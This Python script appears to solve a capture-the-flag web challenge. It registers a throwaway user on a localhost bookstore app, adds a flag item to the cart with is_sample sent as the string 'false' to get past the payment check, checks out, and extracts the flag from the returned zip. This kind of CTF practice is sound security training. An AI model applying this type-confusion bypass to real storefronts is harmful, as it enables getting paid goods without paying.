import requests
import zipfile
import io
import uuid

BASE_URL = "http://localhost:3000"  # Change if remote

def solve():
    session = requests.Session()
    
    # Register a new user
    username = f"user_{uuid.uuid4().hex[:8]}"
    password = "password123"
    
    print(f"[*] Registering user: {username}")
    resp = session.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password
    })
    
    # Add flag to cart with is_sample="false" (non-numeric string)
    print("[*] Adding flag to cart with is_sample='false'")
    resp = session.post(f"{BASE_URL}/cart/add", json={
        "products": [{
            "book_id": "2a16e349fb9045fa",
            "is_sample": "false"
        }]
    })
    print(f"[*] Add response: {resp.text}")
    
    # Check cart balance
    print("[*] Checking cart")
    resp = session.get(f"{BASE_URL}/cart")
    print(f"[*] Cart: {resp.text}")
    
    # Checkout
    print("[*] Checking out")
    resp = session.post(f"{BASE_URL}/cart/checkout")
    
    if resp.headers.get('Content-Type') == 'application/zip':
        print("[*] Received zip file")
        # Extract and check contents
        z = zipfile.ZipFile(io.BytesIO(resp.content))
        for name in z.namelist():
            print(f"[*] Found file: {name}")
            if 'flag' in name:
                content = z.read(name).decode('utf-8', errors='ignore')
                print(f"[*] Content of {name}:\n{content}")
                if 'bun{' in content or 'flag{' in content or 'FLAG{' in content:
                    print(f"[+] Found flag: {content}")
                    return
    else:
        print(f"[!] Unexpected response: {resp.text}")

if __name__ == "__main__":
    solve()
